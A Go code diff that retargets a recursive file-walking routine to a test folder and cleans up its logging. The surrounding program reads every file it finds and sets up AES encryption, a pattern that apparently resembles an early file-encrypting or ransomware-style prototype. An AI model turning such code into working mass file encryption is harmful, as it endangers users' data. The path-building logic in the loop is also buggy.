@@ -21,13 +21,15 @@ func main() {
 	home, _ := os.UserHomeDir()
 	fmt.Println("home ", home)
 
-	files, err := os.ReadDir(".")
+	testdir := ".\\test"
+
+	files, err := os.ReadDir(testdir)
 	if err != nil {
-		fmt.Println(err)
+		fmt.Println("ERROR: ", err)
 		os.Exit(1)
 	}
 
-	traverseFiles(files, ".")
+	traverseFiles(files, testdir)
 
 	c, err := aes.NewCipher(key)
 	if err != nil {
@@ -55,28 +57,23 @@ func main() {
 }
 
 func dirRecurse(dirname os.DirEntry, base string) {
-	fmt.Println("dir name ", dirname.Name())
-	fmt.Println("base and name ", base+dirname.Name())
 	files, err := os.ReadDir(base)
 	if err != nil {
 		fmt.Println(err)
 		os.Exit(1)
 	}
-	fmt.Println("there")
 	traverseFiles(files, base)
 }
 
 func traverseFiles(files []os.DirEntry, base string) {
 	for _, file := range files {
 		if file.IsDir() {
-			fmt.Println(file.Name(), " is a dir")
+			fmt.Println("traverseFiles read dir path: ", base+"\\"+file.Name())
 			base = base + "\\" + file.Name()
-			fmt.Println("base ", base)
 			dirRecurse(file, base)
 		} else {
-			base = base + "\\"
-			fmt.Println("just a file ", base+file.Name())
-			data, err := os.ReadFile(base + file.Name())
+			fmt.Println("traverseFiles read file path: ", base+"\\"+file.Name())
+			data, err := os.ReadFile(base + "\\" + file.Name())
 			if err != nil {
 				fmt.Println(err)
 				os.Exit(1)
